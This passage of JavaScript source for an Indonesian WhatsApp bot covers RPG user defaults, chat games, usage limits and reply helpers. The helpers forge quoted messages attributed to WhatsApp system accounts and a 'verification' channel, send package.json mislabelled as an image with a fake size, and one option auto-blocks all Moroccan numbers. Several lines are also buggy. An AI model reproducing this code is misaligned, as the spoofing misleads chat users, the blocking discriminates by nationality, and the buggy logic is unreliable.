if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 1
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,
money: 100000,
exp: 0,
level: 1,
limit: 20,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 1000,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 1,
armordurability: 0,
sword: 1,
sworddurability: 0,
pickaxe: 1,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
apel: 20,
pisang: 0,
anggur: 0,
mangga: 0,
jeruk: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0

}



const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
    		if (!('autoread' in setting)) setting.autoread = false
        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
        if (!('onlygrub' in setting)) setting.onlygrub = true
        if (!('onlypc' in setting)) setting.onlypc = false
        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = true
	  } else global.db.settings[botNumber] = {
    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoread: false,
    		auto_ai_grup: false,
    		goodbye: false,
        onlygrub: false,
        onlypc: false,
        welcome: false, 
    		autoread: false
	    }
	    
	    	
} catch (err) {
console.error(err)
}

if (m.isGroup && isMute) {
if (!isAdmins && !TradID) return
}


if (!TradzSigma.public) {
if (!m.key.fromMe) return
}
if (db.settings[botNumber].autoread) {
            TradzSigma.readMessages([m.key])
}
if (m.message) {
    if (senderNumber === global.nomorbot) {
        console.log(chalk.red.bold('\n💬  BOT MESSAGE 💬'));
        console.log(chalk.yellow.bold(`🤖 Pesan Bot:`) + chalk.white(` ${m.body || m.mtype}`));
        console.log(chalk.gray('─────────────────────────────────────\n'));
    } else {
        console.log(chalk.green.bold('\n📩  NEW MESSAGE 📩'));
        console.log(chalk.magenta(`📅 Tanggal: `) + chalk.white(`${new Date().toLocaleString()}`));
        console.log(chalk.cyan(`💬 Pesan: `) + chalk.white(`${budy || m.mtype}`));
        console.log(chalk.blue(`👤 Pengirim: `) + chalk.white(`${pushname}`));
        console.log(chalk.blueBright(`🆔 JID: `) + chalk.white(`${senderNumber}`));

        if (m.isGroup) {
            console.log(chalk.yellow(`🏷️ Grup: `) + chalk.white(`${groupName}`));
            console.log(chalk.yellowBright(`🆔 GroupJid: `) + chalk.white(`${m.chat}`));
        }

        console.log(chalk.gray('─────────────────────────────────────\n'));
    }
}

if (isCmd && !isUser) {
verifikasiuser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(verifikasiuser, null, 2))
}

TradzSigma.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan Tag Dia!
Dia AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {

            kuis = true

            jawaban = kuismath[m.sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {

await reply(`🎮 Kuis Matematika 🎮\tidak ada Jawaban Benar 🎉\dan Mau Main Lagi? Mengirim ${prefix}math mode`)

delete kuismath[m.sender.split('@')[0]]

            } else reply('*Wrong Answer!*')

        }


//TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room13 = Object.values(this.game).find(room13 => room13.id && room13.game && room13.state && room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender) && room13.state == 'PLAYING')
	    if (room13) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room13.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Permainan Telah Berakhir',
	    '-2': 'Tidak sah',
	    '-1': 'Posisi Tidak Valid',
	    0: 'Posisi Tidak Valid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room13.game.winner) isWin = true
	    else if (room13.game.board === 511) isTie = true
	    let arr = room13.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room13.game._currentTurn = m.sender === room13.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room13.game.currentTurn : room13.game.winner
	    let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
❌: @${room13.game.playerX.split('@')[0]}
⭕: @${room13.game.playerO.split('@')[0]}

Ketik *surrender* untuk menyerah dan mengaku kalah`
	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room13.x !== room13.o) await TradzSigma.sendText(room13.x, str, m, { mentions: parseMention(str) } )
	    await TradzSigma.sendText(room13.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room13.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    TradzSigma.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    TradzSigma.sendText(m.chat, `Jas telah dikirim ke obrolan

@${roof.p.split`@`[0]} 
and 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing-masing"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) TradzSigma.sendText(roof.p, `Silahkan pilih \n\nBatu\nKertas\nGunting`, m)
	    if (!roof.pilih2) TradzSigma.sendText(roof.p2, `Silahkan pilih \n\nBatu\nKertas\nGunting`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) TradzSigma.sendText(m.chat, `Kedua Pemain Tidak Ingin Bermain,\nSuit Dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    TradzSigma.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Tidak Memilih Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /Gunting/i
	    let b = /Batu/i
	    let k = /Kertas/i
	    let reg = /^(Gunting|Batu|Kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\n Menunggu lawan untuk memilih` : ''}`)
	    if (!roof.pilih2) TradzSigma.sendText(roof.p2, '_Lawan telah memilih\kSekarang giliranmu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`_Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\n Menunggu lawan untuk memilih_` : ''}`)
	    if (!roof.pilih) TradzSigma.sendText(roof.p, '_ Lawan telah memilih Sekarang giliranmu_', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    TradzSigma.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

		// auto set bio
	if (db.settings[botNumber].autobio) {
	    let setting = global.db.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await TradzSigma.updateProfileStatus(`${TradzSigma.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}

//autoblock 212
if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return TradzSigma.updateBlockStatus(m.sender, 'block')
}

//autokick 212
if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return 
}


//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await TradzSigma.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}


function roundRect(ctx, x, y, width, height, radius, fill, stroke) {
  if (typeof stroke === 'undefined') stroke = true
  if (typeof radius === 'number') radius = { tl: radius, tr: radius, br: radius, bl: radius }
  ctx.beginPath()
  ctx.moveTo(x + radius.tl, y)
  ctx.lineTo(x + width - radius.tr, y)
  ctx.quadraticCurveTo(x + width, y, x + width, y + radius.tr)
  ctx.lineTo(x + width, y + height - radius.br)
  ctx.quadraticCurveTo(x + width, y + height, x + width - radius.br, y + height)
  ctx.lineTo(x + radius.bl, y + height)
  ctx.quadraticCurveTo(x, y + height, x, y + height - radius.bl)
  ctx.lineTo(x, y + radius.tl)
  ctx.quadraticCurveTo(x, y, x + radius.tl, y)
  ctx.closePath()
  if (fill) ctx.fill()
  if (stroke) ctx.stroke()
}
//==================================================//
const configPath = './lib/groupConfig.json';

function loadConfig() {
if (!fs.existsSync(configPath)) fs.writeFileSync(configPath, "{}");
return JSON.parse(fs.readFileSync(configPath, 'utf-8'));
}

function saveConfig(config) {
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
}

function ensureGroupConfig(groupId) {
let config = loadConfig();
if (!config[groupId]) {
config[groupId] = {
welcome: false,
message: "Selamat datang @user di @grup!\n\n@desk",
buttons: [
{ "buttonId": ".intro", "buttonText": "Perkenalan" },
{ "buttonId": ".rules", "buttonText": "Aturan" }
],
rules: "📌 Tidak ada peraturan yang ditetapkan!",
intro: "📌 Silakan isi perkenalan:\n- Nama:\n- Umur:\n- Hobi:",
};
saveConfig(config);
}
}
//=================================================//
//////ai///
const SESSION_FILE = "./session/ai_sessions.json";

let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};

function saveSession() {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}
//////ai///

function generateFandomCode() {
  const charset = '0123456789';
  let code = '*ID :* ';
  for (let i = 0; i < 9; i++) {
    code += charset.charAt(Math.floor(Math.random() * charset.length));
  }
  return code;
}

function loadSettings() {
    try {
        const data = fs.readFileSync(SETTINGS_PATH);
        return JSON.parse(data);
    } catch (e) {
        return { autosholat: true }; // default config
    }
}

function saveSettings() {
    fs.writeFileSync(SETTINGS_PATH, JSON.stringify(global.settings, null, 2));
}

function loadGiveaway() {
    if (!fs.existsSync(giveawayFile)) return { status: false, hadiah: "", peserta: [], jumlah: 1 };
    return JSON.parse(fs.readFileSync(giveawayFile));
}

function saveGiveaway(data) {
    fs.writeFileSync(giveawayFile, JSON.stringify(data, null, 2));
}

function saveRegisteredUsers() {
    fs.writeFileSync('./database/registered.json', JSON.stringify(global.registeredUsers, null, 2));
}

function addRegisteredUser(jid, name, age, serial) {
    global.registeredUsers.push({ jid, name, age, serial });
    saveRegisteredUsers();
}

function checkRegisteredUser(jid) {
    return global.registeredUsers.some(user => user.jid === jid);
}


function removeRegisteredUser(jid) {
    const index = global.registeredUsers.findIndex(u => u.jid === jid);
    if (index !== -1) {
        global.registeredUsers.splice(index, 1);
        saveRegisteredUsers();
        return true;
    }
    return false;
}

function createSerial(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let serial = '';
    for (let i = 0; i < length; i++) {
        serial += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return serial;
}

function getToday() {
    return new Date().toISOString().slice(0, 10); // Format YYYY-MM-DD
}

function cekLimit(sender) {
    if (!limitDB[sender]) {
        limitDB[sender] = {
            limit: 10,
            lastClaim: getToday()
        };
    }

    if (limitDB[sender].lastClaim !== getToday()) {
        // Reset limit harian
        limitDB[sender].limit = 10;
        limitDB[sender].lastClaim = getToday();
    }

    fs.writeFileSync(LIMIT_PATH, JSON.stringify(limitDB, null, 2));
    return limitDB[sender].limit;
}

function kurangiLimit(sender, jumlah = 1) {
    if (cekLimit(sender) >= jumlah) {
        limitDB[sender].limit -= jumlah;
        fs.writeFileSync(LIMIT_PATH, JSON.stringify(limitDB, null, 2));
        return true;
    }
    return false;
}

function saveLimit() {
    fs.writeFileSync(LIMIT_PATH, JSON.stringify(limitDB, null, 2));
}

function getLimit(id) {
    if (!limitDB[id]) {
        limitDB[id] = { limit: 3, lastReset: Date.now() };
        saveLimit();
    }

    const resetInterval = 86400000; // 24 jam
    if (Date.now() - limitDB[id].lastReset >= resetInterval) {
        limitDB[id].limit = 3;
        limitDB[id].lastReset = Date.now();
        saveLimit();
    }

    return limitDB[id].limit;
}

function reduceLimit(id) {
    if (!limitDB[id]) return getLimit(id);
    if (limitDB[id].limit > 0) {
        limitDB[id].limit--;
        saveLimit();
    }
    return limitDB[id].limit;
}

function addLimit(id, count) {
    if (!limitDB[id]) getLimit(id);
    limitDB[id].limit += count;
    saveLimit();
}

function tambahLimit(sender, jumlah = 1) {
    if (!limitDB[sender]) {
        limitDB[sender] = {
            limit: 10,
            lastClaim: getToday()
        };
    }

    // Reset jika hari baru
    if (limitDB[sender].lastClaim !== getToday()) {
        limitDB[sender].limit = 10;
        limitDB[sender].lastClaim = getToday();
    }

    limitDB[sender].limit += jumlah;
    fs.writeFileSync(LIMIT_PATH, JSON.stringify(limitDB, null, 2));
}

function loadJson(file) {
    return fs.existsSync(file) ? JSON.parse(fs.readFileSync(file)) : {};
}
function saveJson(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}
function pick(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function loadMoneyDb() {
    try {
        return fs.existsSync(moneyDbPath) ? JSON.parse(fs.readFileSync(moneyDbPath)) : {};
    } catch (err) {
        console.error('❌ Gagal baca rpgmoney.json:', err);
        return {};
    }
}

// Fungsi untuk simpan database
function saveMoneyDb(db) {
    fs.writeFileSync(moneyDbPath, JSON.stringify(db, null, 2));
}

function formatMoneyShort(number) {
    if (number >= 1_000_000_000) return 'Rp ' + (number / 1_000_000_000).toFixed(1).replace('.0', '') + 'M';
    if (number >= 1_000_000) return 'Rp ' + (number / 1_000_000).toFixed(1).replace('.0', '') + 'jt';
    if (number >= 1_000) return 'Rp ' + (number / 1_000).toFixed(1).replace('.0', '') + 'rb';
    return 'Rp ' + number.toLocaleString();
}

async function createNGLImage(text, senderName = 'Anonim') {
  // Double the canvas size for HD quality
  const scaleFactor = 2;
  const canvas = createCanvas(1080 * scaleFactor, 1080 * scaleFactor);
  const ctx = canvas.getContext('2d');
  
  // Enable anti-aliasing for smoother text and graphics
  ctx.antialias = 'default';
  ctx.quality = 'high';
  ctx.textDrawingMode = 'path';

  // High-quality white background
  ctx.fillStyle = '#ffffff';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // PERUBAHAN UTAMA: Ukuran bubble diperbesar
  const boxWidth = 980 * scaleFactor; // Lebar diperbesar dari 880 ke 980
  const boxHeight = 520 * scaleFactor; // Tinggi diperbesar dari 420 ke 520
  const radius = 40 * scaleFactor;
  const boxX = (canvas.width - boxWidth) / 2;
  const boxY = 250 * scaleFactor; // Posisi lebih ke atas untuk memberi ruang

  // Enhanced shadow with better quality
  ctx.shadowColor = 'rgba(0, 0, 0, 0.15)';
  ctx.shadowBlur = 30 * scaleFactor;
  ctx.shadowOffsetX = 0;
  ctx.shadowOffsetY = 15 * scaleFactor;

  // Main bubble with smoother corners (lebih besar)
  ctx.beginPath();
  ctx.moveTo(boxX + radius, boxY);
  ctx.lineTo(boxX + boxWidth - radius, boxY);
  ctx.quadraticCurveTo(boxX + boxWidth, boxY, boxX + boxWidth, boxY + radius);
  ctx.lineTo(boxX + boxWidth, boxY + boxHeight - radius);
  ctx.quadraticCurveTo(boxX + boxWidth, boxY + boxHeight, boxX + boxWidth - radius, boxY + boxHeight);
  ctx.lineTo(boxX + radius, boxY + boxHeight);
  ctx.quadraticCurveTo(boxX, boxY + boxHeight, boxX, boxY + boxHeight - radius);
  ctx.lineTo(boxX, boxY + radius);
  ctx.quadraticCurveTo(boxX, boxY, boxX + radius, boxY);
  ctx.closePath();
  ctx.fillStyle = '#ffffff';
  ctx.fill();

  // Black header section (50% of bubble height) - TETAP ADA
  const upperHeight = boxHeight * 0.5;
  ctx.beginPath();
  ctx.moveTo(boxX + radius, boxY);
  ctx.lineTo(boxX + boxWidth - radius, boxY);
  ctx.quadraticCurveTo(boxX + boxWidth, boxY, boxX + boxWidth, boxY + radius);
  ctx.lineTo(boxX + boxWidth, boxY + upperHeight);
  ctx.lineTo(boxX, boxY + upperHeight);
  ctx.lineTo(boxX, boxY + radius);
  ctx.quadraticCurveTo(boxX, boxY, boxX + radius, boxY);
  ctx.closePath();
  ctx.fillStyle = '#000000';
  ctx.fill();

  // High-quality title text with better font
  ctx.fillStyle = '#ffffff';
  ctx.font = `bold ${52 * scaleFactor}px 'Segoe UI', 'Helvetica Neue', sans-serif`; // Font size diperbesar
  ctx.textAlign = 'center';
  ctx.textBaseline = 'middle';
  ctx.fillText('Pesan dari sepuh', canvas.width / 2, boxY + upperHeight / 2);

  // Main content text - NOW BOLD with larger size
  ctx.fillStyle = '#000000';
  ctx.font = `bold ${58 * scaleFactor}px 'Segoe UI', 'Helvetica Neue', sans-serif`; // Font size diperbesar
  ctx.textAlign = 'center';
  ctx.textBaseline = 'top';

  // Enhanced text wrapping algorithm dengan ruang lebih besar
  const lines = [];
  const words = text.split(' ');
  let line = '';
  const maxWidth = boxWidth - 120 * scaleFactor; // Padding lebih longgar
  const lineHeight = 70 * scaleFactor; // Jarak antar baris lebih besar

  for (let word of words) {
    const testLine = line + word + ' ';
    const metrics = ctx.measureText(testLine);
    if (metrics.width > maxWidth) {
      lines.push(line.trim());
      line = word + ' ';
    } else {
      line = testLine;
    }
  }
  lines.push(line.trim());

  const textYStart = boxY + upperHeight + 50 * scaleFactor; // Jarak dari header lebih besar

  // Draw each line with better spacing
  for (let i = 0; i < lines.length; i++) {
    ctx.fillText(lines[i], canvas.width / 2, textYStart + i * lineHeight);
  }

  // Subtle watermark with smaller size
  ctx.fillStyle = 'rgba(136, 136, 136, 0.7)';
  ctx.font = `italic ${32 * scaleFactor}px 'Segoe UI', sans-serif`;
  ctx.textAlign = 'right';
  ctx.textBaseline = 'bottom';
  ctx.fillText(`@${senderName}`, canvas.width - 60 * scaleFactor, canvas.height - 60 * scaleFactor);

  // Return HD quality JPEG with 100% quality
  return canvas.toBuffer('image/jpeg', {
    quality: 1.0,
    chromaSubsampling: false
  });
}

async function getYouTubeData(query) {
    const search = await yts(query);
    if (!search || !search.all || search.all.length === 0) return null;

    const video = search.all[0];
    return {
        title: video.title,
        duration: video.timestamp,
        url: video.url,
        thumbnail: video.thumbnail
    };
}

async function toIDR(x) {
  x = x.toString();
  var pattern = /(-?\d+)(\d{3})/;
  while (pattern.test(x)) x = x.replace(pattern, "$1.$2");
  return x;
}

async function sendTradzSigmaMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await TradzSigma.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
const replykerja = (teks) => {
TradzSigma.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: 'ᴘɪʟɪʜ ᴘᴇᴋᴇʀᴊᴀᴀɴ ᴍᴜ',
thumbnailUrl: "https://files.catbox.moe/l4jw4v.jpg",
sourceUrl: "https://whatsapp.com/channel/0029Vb9DN5RIt5s5BRmGT50z",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m });
}

const replybankcek = (teks) => {
TradzSigma.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title:`${global.namabot}`,
body: '𝗕𝗔𝗡𝗞 𝗖𝗘𝗞',
thumbnailUrl: "https://files.catbox.moe/c2f4d3.jpg",
sourceUrl: "https://whatsapp.com/channel/0029Vb9DN5RIt5s5BRmGT50z",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m });
}

const replydaftar = (teks) => {
TradzSigma.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: 'Silahkan Daftar🍁',
body: 'Register JinshiMD',
thumbnailUrl: "https://files.catbox.moe/sr1s8l.jpg",
sourceUrl: "https://whatsapp.com/channel/0029Vb5tjub8F2p55FXaN80p",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m });
}

const replyme = (teks) => {
TradzSigma.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: "𝗣𝗥𝗢𝗙𝗜𝗟",
body: 'ᴘʀᴏғɪʟ ᴋᴀᴍᴜ',
thumbnailUrl: 'https://files.catbox.moe/19pgy0.jpg',
sourceUrl: "https://chat.whatsapp.com/Gv1gsvCBiukEBpaRQ4qDSO",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m });
}

const replycraft = (teks) => {
TradzSigma.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: "𝗖𝗥𝗔𝗙𝗧 & 𝗨𝗣𝗚𝗥𝗔𝗗𝗘",
body: `${global.namabot}`,
thumbnailUrl: "https://files.catbox.moe/csz5x5.jpg",
sourceUrl: "https://whatsapp.com/channel/0029Vb9DN5RIt5s5BRmGT50z",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m });
}
const reply = async(teks, id = m.chat) => {
TradzSigma.sendMessage(id, {
            document: fs.readFileSync("./package.json"),
           fileName: ucapanWaktu,
           fileLength: 99999,
            mimetype: 'image/png',
           jpegThumbnail:fs.readFileSync("./library/data/media/reply.jpg"),
            caption: "\n" + teks,
}, { quoted:fsaluran,ephemeralExpiration: 86400});
}
const penggunaan = (teks) => {
            return `Penggunaan :\n\n${prefix + command} *${teks}*`
        }
 
const xy = { key:{ remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message:{ newsletterAdminInviteMessage: { newsletterJid: 'nd@newsletter', newsletterName: 'Information', caption: `© ${ownername} | 2025`, inviteExpiration: 0}}}

let Tradz = {
            key: {
                remoteJid: 'status@broadcast',
                participant: `6283844671188@s.whatsapp.net`
            },
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: '120363314209665405@newsletter',
                    newsletterName: 'ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ',
                    caption: `ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${ownername}`,
                    inviteExpiration: 0
                }
            }
        }
const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363401647250932@newsletter',
    newsletterName: '',
    caption: body
}}}
const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `${botname} By ${ownername}`,jpegThumbnail: await reSize("./library/data/media/ppkecil.jpg", 200, 200) }}}
const qdev = { key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net" }, message: { extendedTextMessage: { text: `${prefix + command}`, contextInfo: { externalAdReply: { title: global.namaSaluran, body: "Pesan diteruskan dari Channel", thumbnailUrl: fs.readFileSync("./library/data/media/store.jpg"), mediaType: 1, renderLargerThumbnail: true, sourceUrl: global.linkSaluran }, forwardingScore: 2, isForwarded: true }}}}
const replyviex = async(teks, id = m.chat) => {
TradzSigma.sendMessage(id, {
            document: fs.readFileSync("./package.json"),
           fileName: ucapanWaktu,
           fileLength: 99999,
            mimetype: 'image/png',
           jpegThumbnail:fs.readFileSync("./library/data/media/reply.jpg"),
            caption: "\n" + teks,
}, { quoted:fsaluran,ephemeralExpiration: 86400});
}
//////
//=========================//
//Pengubah Text
const CfontTradz = (text, style = 1) => {
  var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var raol = {
